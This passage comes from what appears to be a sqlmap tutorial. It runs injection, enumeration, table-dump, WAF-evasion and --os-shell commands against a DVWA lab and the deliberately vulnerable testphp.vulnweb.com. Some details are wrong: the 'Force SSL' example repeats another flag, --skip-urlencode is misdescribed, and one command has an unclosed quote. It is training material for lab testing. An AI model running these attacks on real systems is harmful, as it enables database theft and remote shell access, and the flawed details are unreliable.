| `--timeout=200`         | Waits up to 200 seconds for each response before timing out.                |
| `--retries=6`           | Retries failed requests up to 6 times.                                     |
| `--ignore-timeouts`     | Ignores timeout errors and continues scanning.                             |

- Use This Setup?
    - Slow Servers: Some targets respond slowly due to load or intentional throttling.
    - WAF/IPS Delays: Firewalls may introduce artificial delays to frustrate scanners.
    - Blind SQL Injection: Responses may take longer due to time-based payloads.

---

#### Randomizing Parameters
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=helo&Submit=Submit#" --randomize=id -v5
````
<img width="965" height="769" alt="image" src="https://github.com/user-attachments/assets/695e64cb-f153-41e0-acd6-5577b767c82f" />

<img width="1869" height="814" alt="image" src="https://github.com/user-attachments/assets/10cadeb7-f5b0-4699-955c-6c00a59c6291" />

| **Option**           | **Description**                                                           |
|----------------------|---------------------------------------------------------------------------|
| `-u`                 | Target URL with the vulnerable `id` parameter.                              |
| `hello`              | Test value for the `id` parameter ‚Äî SQLMap will try to inject here.          |
| `Submit=Submit#`     | Mimics form submission; `#` is often used to terminate the query.           |
| `--randomize=id`     | Randomizes the value of `id` on each request to evade WAF detection.         |
| `-v5`                | Sets verbosity level to 5 ‚Äî shows full HTTP requests and responses.          |

---


#### Encoding and SSL Options
- Skip URL Decoding

````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --skip-urlencode
````
<img width="1909" height="786" alt="image" src="https://github.com/user-attachments/assets/25a5c3d7-7416-414d-b5ff-2111e76357e7" />

| **Option**           | **Description**                                                           |
|----------------------|---------------------------------------------------------------------------|
| `--skip-urlencode`   | Prevents SQLMap from URL-decoding payloads before sending them.              |
Use Case:
   ‚Ä¢ 	Targets that double-encode values (e.g., `%2527` instead of `%27`)
   ‚Ä¢ 	Avoids breaking payloads during decoding
   ‚Ä¢ 	Useful in apps with custom encoding logic


- Force SSL
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --skip-urlencode
````
<img width="1907" height="814" alt="image" src="https://github.com/user-attachments/assets/c15d115b-a954-46d4-a41f-d5662ed48889" />


| **Option**      | **Description**                                                           |
|-----------------|---------------------------------------------------------------------------|
| `--force-ssl`   | Forces SQLMap to use HTTPS even if the URL starts with HTTP.                  |




#### Chunked Transfer encoding
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/" \
  -p id \
  --data="id=1&Submit=Submit" \
  --chunked \
  --cookie="PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6; security=low" \
  --batch

````
<img width="1896" height="784" alt="image" src="https://github.com/user-attachments/assets/b7c14af7-5fc1-4f14-b4b4-9279af153279" />

<img width="1585" height="812" alt="image" src="https://github.com/user-attachments/assets/2cf0d9a8-6070-4ede-95f0-058a46a1ff62" />


---



#### HTTP Parameter Pollution (HPP)
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --hpp --batch
````
<img width="1897" height="801" alt="image" src="https://github.com/user-attachments/assets/bc200eca-1d85-4f01-9e2b-a36f07c2740c" />

- Use This Setup?
   ‚Ä¢ 	Bypass WAFs:
Some firewalls only inspect the first or last instance of a parameter. Sending duplicates can sneak payloads past them.
   ‚Ä¢ 	Trigger Backend Logic:
Different server-side frameworks handle duplicates differently ‚Äî some use the first value, others the last, and some merge them.
   ‚Ä¢ 	Exploit Hidden Behaviors:
You might trigger unexpected SQL queries or bypass input validation by polluting parameters.



---

#### Dynamic Request Modification (Eval)
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
--eval="import random;id=random.randint(1,10)"
````
<img width="1909" height="806" alt="image" src="https://github.com/user-attachments/assets/42539f6b-1a10-4fd2-a9e5-1816822fc018" />

- Use This Setup?
   ‚Ä¢ 	Custom Payload Logic:
You can dynamically change parameters, headers, or even cookies before each request.
   ‚Ä¢ 	WAF Evasion:
Randomizing values helps avoid detection by pattern-based firewalls.
   ‚Ä¢ 	Advanced Automation:
Useful in fuzzing, rotating tokens, or simulating real user behavior.


---







## Performance Optimization ‚Äì Stealth and speed tuning
### O 
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -o -v 5
````
<img width="913" height="807" alt="image" src="https://github.com/user-attachments/assets/5f57b37c-f0db-4119-a8bd-4e844263ceb1" />

<img width="539" height="808" alt="image" src="https://github.com/user-attachments/assets/5e5cedfa-b000-4657-85a1-640c708d863b" />

<img width="906" height="800" alt="image" src="https://github.com/user-attachments/assets/49ac893f-fdfb-4ae1-b357-e2542552fbfb" />



### Predict-output
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --predict-output -v 5
````
<img width="801" height="799" alt="image" src="https://github.com/user-attachments/assets/e9deade5-9713-46b5-ada8-1de869d89509" />

<img width="1865" height="783" alt="image" src="https://github.com/user-attachments/assets/75769f22-1ff1-42c5-832a-9b8ccf2c28c7" />

- Use This Setup?
‚Ä¢ 	Faster Enumeration:
Instead of dumping entire tables, SQLMap predicts likely values (e.g.,admin ,root ,test ) and checks if they exist.
‚Ä¢ 	Useful in Time-Based Attacks:
Reduces the number of requests needed when each response is slow.
‚Ä¢ 	Smart Guessing:
SQLMap uses built-in heuristics and common patterns to guess usernames, database names, etc.



### keep-alive
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --keep-alive
````
<img width="1903" height="806" alt="image" src="https://github.com/user-attachments/assets/03eb0d4a-9957-4c61-877f-f7caad5b4661" />

- Why use --keep-alive?
   - Reduces TCP overhead (faster scans if target supports it).
   - Helps bypass some rate-limiting or WAFs that expect multiple requests per connection.
   - More ‚Äúnatural‚Äù traffic compared to opening a new TCP connection for every payload.


### Null connection
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --headers="Connection: null"
````
<img width="1902" height="792" alt="image" src="https://github.com/user-attachments/assets/18b00aaa-d834-432a-a4af-f8c21348a3ea" />



### Multi-threading
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --threads=5
````
<img width="1912" height="784" alt="image" src="https://github.com/user-attachments/assets/f33f9ae2-b645-4e4b-829c-dddc5612258d" />

- What Multi-Threading Does:
  - Instead of sending one request at a time, SQLMap sends 5 requests in parallel.
  - This dramatically speeds up blind SQL injection attacks (where SQLMap guesses database content bit by bit based on response delays or boolean outcomes).

````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=1&Submit=Submit#" --null-connection --threads=5
````
<img width="1905" height="751" alt="image" src="https://github.com/user-attachments/assets/fcb3dc05-40b3-4b96-bfee-ab60d8083cd0" />


---



##  SQL Injection Techniques ‚Äì Boolean, Error, Time, UNION, stacked queries

### Tartget Parameter Testing
````
sqlmap -r '/home/k4n0ng/Desktop/request.raw' -p "uname"
````
<img width="1909" height="787" alt="image" src="https://github.com/user-attachments/assets/aed95092-6542-4c51-b3a3-fc6a5daa41fa" />


- Does -p Do?
The -p flag (parameter) overrides SQLMap‚Äôs default behavior of testing all parameters (GET, POST, Cookie, Header).

- Why use it?
Saves time during pentests.
Avoids noise or false positives from harmless parameters.
Focuses on parameters known to be risky (e.g., id, uid, session, category, search, etc.).

- By default, sqlmap tests all GET, POST, Cookie, and Header parameters for vulnerabilities. The -p option allows the tester to focus only on specific parameters, saving time. In this case, it will only check the id and useragent for SQL injection.
- `HTTP Header`
<img width="831" height="412" alt="image" src="https://github.com/user-attachments/assets/b6ad40de-65f8-4baa-b772-3bb86cf7f4f8" />



### skip Parameters 
````
sqlmap -r '/home/k4n0ng/Desktop/request.raw' --skip="uname"
````
<img width="1721" height="806" alt="image" src="https://github.com/user-attachments/assets/7a8ffa69-f7e0-4a1a-8912-b4b125194f8c" />

- What Does `--skip="uname"` Do?
The `--skip` option tells SQLMap to skip testing specific parameters during injection checks.
So if your raw HTTP request (`request.raw`) contains a parameter named `uname` (e.g., in URL, POST body, or cookie), SQLMap will ignore it and not test it for SQL injection.

````
sqlmap -r '/home/k4n0ng/Desktop/request.raw' --skip="uname -v 5
````
<img width="1071" height="759" alt="image" src="https://github.com/user-attachments/assets/55b4e4b8-48f0-46b4-8920-11e24df95780" />





### skip Static Parameters
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=5" --skip-static
````
<img width="1565" height="821" alt="image" src="https://github.com/user-attachments/assets/2046d196-7f52-4d1b-b719-c2525e5cd68f" />

-  What --skip-static Does
The --skip-static flag tells sqlmap to skip testing parameters that appear to be static (non-dynamic) ‚Äî i.e., parameters whose value doesn‚Äôt seem to affect the page content.

- How it works:
  - SQLMap sends two requests:
     - Original: `?artist=2`
     - Modified: `?artist=5` (or random value)
  - If the response content is identical, sqlmap assumes `artist` is static (e.g., just a label, not used in a database query).
With `--skip-static`, it won‚Äôt waste time testing such parameters for SQL injection.

````
sqlmap --flush-session -u "http://testphp.vulnweb.com/artists.php?artist=5" -p artist --skip-static --batch
````
<img width="1231" height="811" alt="image" src="https://github.com/user-attachments/assets/f1a1dc70-b23b-4e02-a9ec-9f7c3ab15637" />

#### More command
1. Enumerate databases:
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=5" -p artist --dbs --batch
````

2. List tables for a database
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=5" -p artist -D DBNAME --tables --batch
````

3. List columns for a table (replace DBNAME and TABLENAME):
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=5" -p artist -D DBNAME -T TABLENAME --columns --batch
````

4. Dump a table (only on authorized/lab targets):
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=5" -p artist -D DBNAME -T TABLENAME --dump --batch
````

5. If you want faster/concurrent scans (be careful on small targets):
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=5" -p artist --dbs --threads=5 --keep-alive --batch
````

6. If you want deeper tests (more payloads / risk):
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=5" -p artist --level=3 --risk=2 --dbs --batch
````





### Exclude Parameters (--param-exclude)
````
sqlmap -u "http://testphp.vulnweb.com/?id=1&lang=en&theme=dark" --param-exclude="lang,theme" --batch
````
<img width="1221" height="736" alt="image" src="https://github.com/user-attachments/assets/b1f1b147-7f0c-4867-8524-68ba26ba9a9d" />



- What Does --param-exclude Do?
It excludes certain parameters from testing based on their names, using exact matches or even regex patterns. 

- Use Cases:
  - You know lang and theme are client-side preferences (e.g., stored in cookies or localStorage) ‚Äî they don‚Äôt touch the database ‚Üí no point testing them.
  - Some parameters trigger WAFs, logouts, or session resets ‚Äî exclude them to avoid noise or scan interruptions.
  - We want to focus only on high-risk inputs like id, uid, search, etc.

#### More command we can use:
````
sqlmap -u "http://site.com/products?category=books&id=123&lang=en&theme=light&currency=USD&user_id=999" --param-exclude="lang,theme,currency"
````
- This command Faster, smarter, stealthier scan.




### filter Parameter
````
sqlmap -u "http://testphp.vulnweb.com/search.php?q=test&cat=1" --param-filter="GET"
````
<img width="1215" height="747" alt="image" src="https://github.com/user-attachments/assets/b6d4c0c4-1b92-46ce-a18d-8d80df50fdc8" />

- What Does --param-filter Do?
| Parameter Type | Description                                      | Example(s)                          |
|----------------|--------------------------------------------------|-------------------------------------|
| `GET`          | Query string parameters in the URL               | `?id=1`, `?search=admin`            |
| `POST`         | Form-encoded or JSON data in the request body    | `username=admin&pass=123`, `{"id":1}` |
| `Cookie`       | Cookie values sent in the `Cookie` header        | `PHPSESSID=abc123`, `logged_in=1`   |
| `Header`       | HTTP request headers                             | `User-Agent: Mozilla/5.0`, `X-API-Key: abcdef` |
- Or we can use with others like:
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" \   
  --param-filter="COOKIE" \
  --level=2 \
  --batch
````
<img width="1702" height="797" alt="image" src="https://github.com/user-attachments/assets/2f55b347-bb35-4849-9599-0180bcb6efe0" />


````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/?id=helo&Submit=Submit" \
  --cookie="PHPSESSID=n8gv1ji6u4vbiu48ebf320d1r6; logged_in=1" \
  --param-filter="COOKIE" \
  --level=2 \
  --batch \
  --flush-session
````
<img width="1195" height="787" alt="image" src="https://github.com/user-attachments/assets/f9d62c17-b3ca-4045-9868-a6c11f198fec" />



### DBMS Identification
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms="MySQL"
````
<img width="1445" height="812" alt="image" src="https://github.com/user-attachments/assets/a182ce33-1cf7-4984-a81a-2acac50958b0" />

<img width="1909" height="807" alt="image" src="https://github.com/user-attachments/assets/43b352ff-dd2b-49db-b458-3ad0390f281e" />

- Dump all data from a table
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=MySQL -D acuart -T users --dump
````
<img width="1908" height="701" alt="image" src="https://github.com/user-attachments/assets/c8dca89a-e257-4b52-b882-d3cf082930e2" />

<img width="1073" height="727" alt="image" src="https://github.com/user-attachments/assets/5437460d-ba9a-4cb7-8b43-097dff901d6c" />

<img width="1685" height="728" alt="image" src="https://github.com/user-attachments/assets/7816d9a3-7c07-416c-8f66-5cfca32332c8" />

- It's `Brute Forcing` wait a few minutes it will finished and show in table.

- What Does --dbms Do?
The --dbms flag forces SQLMap to assume the backend database is a specific type ‚Äî like MySQL, Oracle, Microsoft SQL Server, or PostgreSQL.
` In this used if we already know name **DATABASE**`

- If we don't know name `DATABASES` go to browser and just add `'` in URL:
<img width="1727" height="541" alt="image" src="https://github.com/user-attachments/assets/25b34edd-11f8-4dbc-8344-eef3868af7c2" />

<img width="1635" height="526" alt="image" src="https://github.com/user-attachments/assets/9c8e9290-62b5-4738-b595-84a110fa2a88" />

But in this some how was block.

- Why Use It?
  - Saves Time
SQLMap won‚Äôt waste time testing for Oracle, MSSQL, etc.
Especially useful if you already know the DBMS from error messages, documentation, or server headers.
  - Increases Accuracy
Some databases have unique syntax (e.g., LIMIT in MySQL vs. TOP in MSSQL).
Forcing the correct DBMS helps SQLMap generate more precise payloads.
  - Reduces Noise
Fewer requests = less chance of triggering WAFs or rate limits.

**Note:** Supported DBMS values include:
MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, Firebird, Sybase, Access, DB2, Informix, MariaDB, CockroachDB, and many more .

#### More command
1. List all databases
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms="MySQL" --dbs
````

3. List tables in the current DB
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms="MySQL" --tables
````

4. Dump the 'users' table
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms="MySQL" -T users --dump
````
--

###  DBMS Authentication (--dbms-cred)
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
  --dbms="MySQL" \
  --dbms-cred="root:password"
````
<img width="1736" height="776" alt="image" src="https://github.com/user-attachments/assets/8f8993d6-b61d-4770-a4bf-593ce27f7156" />

- What Does --dbms-cred Do?
The --dbms-cred flag allows you to provide valid database credentials (username + password) so SQLMap can bypass SQL injection entirely and connect directly to the database server.
Instead of exploiting SQLi to extract data, it logs in like a legitimate user ‚Äî faster, stealthier, and more powerful.




### OS
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --os="linux"
````
<img width="993" height="691" alt="image" src="https://github.com/user-attachments/assets/0da1242c-ac13-42b5-b4f2-e1d0f02a81c2" />

````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=MySQL --os=Linux --os-shell
````


- What Does --os Do?
The --os flag forces SQLMap to assume the underlying operating system is Linux or Windows, which affects:
  - The payloads used for command execution.
  - The file paths and commands SQLMap tries during file read/write or shell access.
  - The privilege escalation techniques it attempts.


- What Are Invalid Value Techniques?
  - These are SQLMap options that help detect SQL injection by sending intentionally malformed or invalid values to parameters and observing how the server responds.
  - If the server reacts differently (e.g., returns an error, changes page content, or delays), it suggests the input is being processed by a database ‚Äî and may be vulnerable.



### Invalid Value Techniques
| OPTION              | WHAT IT DOES                                                                                         | EXAMPLE PAYLOAD    |
| ------------------- | ---------------------------------------------------------------------------------------------------- | ------------------ |
| `--invalid-bignum`  | Replaces the parameter value with a **very large number** (to test numeric handling).                | `id=9999999999999` |
| `--invalid-logical` | Replaces the value with a **logical expression** (to test boolean/logical parsing), e.g. `1 OR 2=2`. | `id=1 OR 2=2`      |
| `--invalid-string`  | Replaces the value with an **invalid string** (to test string handling/quoting).                     | `id='xyz'`         |


#### bignum
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
  --invalid-bignum \
  --flush-session \
  --batch
````
<img width="1160" height="814" alt="image" src="https://github.com/user-attachments/assets/98ab2a7b-1528-408a-b720-483cffe48f22" />

<img width="1669" height="526" alt="image" src="https://github.com/user-attachments/assets/9ed73860-a084-4771-b061-37e15e1b90de" />

- Key SQLMap Flags Used
| Flag                | Purpose                                                                 |
|---------------------|-------------------------------------------------------------------------|
| `--invalid-bignum`  | Replaced `cat=1` with a huge number to trigger MySQL errors ‚Üí confirmed SQL injection potential. |
| `--flush-session`   | Cleared cached results ‚Üí forced a fresh scan (no old data).              |
| `--batch`           | Skipped all interactive prompts ‚Üí fully automated execution.            |


#### Logical

````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --invalid-logical --flush-session --batch
````
<img width="1302" height="800" alt="image" src="https://github.com/user-attachments/assets/96c22887-c753-4a29-b3a3-30bb5f97e7b7" />

<img width="1892" height="793" alt="image" src="https://github.com/user-attachments/assets/24efe52c-ae6c-4bf4-80d5-51c03e1e001d" />

- What `--invalid-logical` Does
Instead of using normal values (like id=1), sqlmap replaces the parameter with a logical SQL expression that evaluates to false or causes a syntax anomaly, for example:

   - `cat=1 AND 1=2`
   - `cat=999 OR 1=1`
   - `cat=(SELECT 1 WHERE 1=0)`
If the application behaves differently (e.g., returns an empty result, an error, or a different HTTP status code) compared to a valid request, sqlmap infers that the input is being interpreted as part of a SQL query ‚Äî indicating potential SQL injection.


#### String
````
sqlmap -u "http://example.com/page?id=1" --string="Product found"
````



- What Does --string Do?
The --string flag tells sqlmap:

‚ÄúWhen testing payloads, consider the response vulnerable only if it contains this exact string.‚Äù



### no-cast & no-escape

````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --no-cast --no-escape --batch
````
<img width="1283" height="816" alt="image" src="https://github.com/user-attachments/assets/63104aea-3a3a-4f57-abea-7bc08a87dd8f" />

<img width="1473" height="780" alt="image" src="https://github.com/user-attachments/assets/cd166f0c-d1cd-466e-bf82-301c5800aabd" />


1/ `--no-cast` : Disables explicit data type casting (e.g., CAST(column AS CHAR) in MySQL).
Useful when the target blocks or filters casting functions like CAST, CONVERT, or ::.
Relies on the database‚Äôs implicit type conversion (e.g., SELECT 123 may still return a string in HTTP responses).
2. `--no-escape` : Disables string escaping in payloads (e.g., avoids using CHAR(65) or 0x41 for 'A').
Sends raw characters like ' or quotes directly instead of encoded equivalents.
Helpful when:
The WAF blocks hex/encoded payloads but allows raw quotes.
You‚Äôre testing a permissive environment where special characters aren‚Äôt filtered.



### Prefix &  Suffix 
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
  --prefix="')" \
  --suffix="-- " \
  --flush-session \
  --batch
````
<img width="1080" height="790" alt="image" src="https://github.com/user-attachments/assets/9db4b8d9-a147-426b-8a62-33f2e4a29de9" />


1. `--prefix="')"`:
   - The --prefix option tells sqlmap to prepend the string ') to the payloads it sends during testing.
   - This is useful when the SQL query in the backend expects a specific syntax, such as closing a parenthesis and a single quote, to make the injected payload syntactically valid.
2. `--suffix="-- "`:
   - The --suffix option tells sqlmap to append the string --  to the payloads.
   - In SQL, -- is a comment indicator that ignores the rest of the line. This is often used to comment out the remainder of a query to prevent syntax errors or unwanted query execution.



### Tamer Scripts
````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --tamper=between.py --batch
````
<img width="1226" height="795" alt="image" src="https://github.com/user-attachments/assets/3cf2893f-941c-495a-8a41-d1ac7640e990" />































































